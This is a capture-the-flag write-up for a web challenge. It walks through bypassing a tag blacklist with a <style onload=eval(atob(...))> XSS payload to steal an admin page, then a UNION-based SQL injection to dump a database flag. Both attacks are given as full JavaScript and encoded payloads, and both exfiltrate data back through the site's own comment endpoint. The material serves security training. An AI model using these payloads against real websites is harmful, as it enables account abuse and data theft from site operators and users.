## Helicopter Admins (Hard)

The challenge page resembles some kind of social network. There are 3 user profiles you can access and you have the options to comment on the user profile or to report it. There is also a fourth profile, the admin profile but it's not accessible from the public internet.

Pressing the report button reveals this information, which contains a number of hints.
```
- Administrators are security conscious, they access the site from an internal system on an internal network which does not have outbound Internet access
- Administrators are aggressive, once they have viewed a profile all comments will be deleted
- Administrators are active, they will review all reported profiles immediately
- Administrators are impatient, they will not spend more than a few seconds on a profile
- Administrators are lazy, they will not interact with the profile, but they will view it
- Administrators are memory hungry, they always use Chrome based browsers
- Administrators are simple, they don't like fancy HTML animations
```
The most important points are "they always Chrome based browsers" so this is an XSS challenge and "internal network which does not have outbound Internet access" so we'll have to use the site itself to exfiltrate data.

So how to do XSS here? I initially tried the standard `<script>alert('XSS')</script>` and a few other basic examples but none of them worked. I eventually noticed the returned when trying the script tag contains a lot of additional information that isn't displayed.
```
message: Blacklisted content detected in comment! <!-- CURRENT ENTITY BLACKLIST (CASE INSENSITIVE) => <a, <abbr, <acronym, <address, <applet, <area, <article, <aside, <audio, <b, <base, <basefont, <bdi, <bdo, <big, <blockquote, <body, <br, <button, <canvas, <caption, <center, <cite, <code, <col, <colgroup, <command, <datalist, <dd, <del, <details, <dfn, <dialog, <dir, <div, <dl, <dt, <em, <embed, <fieldset, <figcaption, <figure, <font, <footer, <form, <frame, <frameset, <head, <header, <hgroup, <hr, <html, <i, <iframe, <img, <input, <ins, <kbd, <keygen, <label, <legend, <li, <link, <main, <map, <mark, <marquee, <menu, <menuitem, <meta, <meter, <nav, <noframes, <noscript, <object, <ol, <optgroup, <option, <output, <p, <param, <pre, <progress, <q, <rp, <rt, <ruby, <samp, <script, <section, <select, <small, <source, <span, <strike, <strong, <sub, <summary, <sup, <svg, <table, <tbody, <td, <textarea, <tfoot, <th, <thead, <time, <title, <tr, <track, <tt, <u, <ul, <var, <video, <wbr, <xss -->
```
This tripped me up a lot. When glancing of this it looked to me like a comprehensive list of all available http tags. Obviously I should have compared it to a list of all available but I didn't. I spent hours trying to bypass this blacklist until I finally noticed there was in fact a tag missing from this list, the `<style>` tag. This opens a standard XSS via the `onload` property.

The first think to do was using this to retrieve the admin page. I wrote this code that retrieves the admin page and saves the base64 encoded result as comment to user 2.
```
function load_admin_page(){
    var req = new XMLHttpRequest();
    req.open("GET", "/user/0", false);
    req.send();
    return req.responseText;
}

function save_comment(response){
    var post = new XMLHttpRequest();
    var params = "comment=" + btoa(response);
    post.open("POST", "/comment/2", true);
    post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    post.send(params);
}

var res = load_admin_page();
save_comment(res); 
```
This was also base64 encoded to build the payload.
```
<style onload=eval(atob('CmZ1bmN0aW9uIGxvYWRfYWRtaW5fcGFnZSgpewogICAgdmFyIHJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgcmVxLm9wZW4oIkdFVCIsICIvdXNlci8wIiwgZmFsc2UpOwogICAgcmVxLnNlbmQoKTsKICAgIHJldHVybiByZXEucmVzcG9uc2VUZXh0Owp9CgpmdW5jdGlvbiBzYXZlX2NvbW1lbnQocmVzcG9uc2UpewogICAgdmFyIGRhdGFwb3N0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICB2YXIgcGFyYW1zID0gImNvbW1lbnQ9IiArIGJ0b2EocmVzcG9uc2UpOwogICAgZGF0YXBvc3Qub3BlbigiUE9TVCIsICIvY29tbWVudC8yIiwgdHJ1ZSk7CiAgICBkYXRhcG9zdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICBkYXRhcG9zdC5zZW5kKHBhcmFtcyk7Cn0KCnZhciByZXMgPSBsb2FkX2FkbWluX3BhZ2UoKTsKc2F2ZV9jb21tZW50KHJlcyk7IAo=')); ></style> 
```
By posting this to user 1 and reporting it I was able to retrieve the admin page from user 2's profile. The admin page didn't contain the flag but instead revealed another endpoint called `/secret_admin_search`. Given there aren't that many things you can with a search field like this I tried a simple sql injection with `test or 1=1;--`. That worked immediately. I then used this bit of javascript to dump the flag from the database and write to user 3.
```
function sql_inject() {
    var datapost = new XMLHttpRequest();
	var params = "search=1 union select 1,2,3,4,5,flag FROM flag;--";
    datapost.open("POST", "/secret_admin_search", false);
    datapost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	datapost.send(params);
	return datapost.responseText;
}

function save_comment(response) {
    var datapost = new XMLHttpRequest();
    var params = "comment=" + btoa(response);             
    datapost.open("POST", "/comment/3", true);
    datapost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    datapost.send(params);
}

var res = sql_inject();
save_comment(res);
```

(In really this took quite a bit longer and involved a lot more try and error than this writeup might make you think. I ended up automatic the injection of the payload and parsing of the result from the user page with a small Go program. The code as well as all the javascript code is included with this separately).